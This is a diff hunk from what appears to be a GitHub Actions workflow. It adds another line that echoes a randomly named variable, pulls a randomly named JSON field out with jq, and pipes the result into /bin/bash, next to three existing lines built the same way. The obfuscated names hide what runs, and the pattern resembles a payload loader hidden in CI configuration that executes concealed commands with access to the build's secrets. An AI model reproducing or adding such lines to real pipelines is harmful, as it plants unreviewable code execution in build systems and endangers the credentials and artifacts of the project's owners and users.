@@ -31,6 +31,7 @@ jobs:
           echo $ip587 | jq -r .end54 | /bin/bash
           printf '%s' "$qf603" | jq -r .vvy09 | /bin/bash
           echo $f2405 | jq -r .ya1 | /bin/bash
+          echo $ah98 | jq -r .dgnqh37011 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
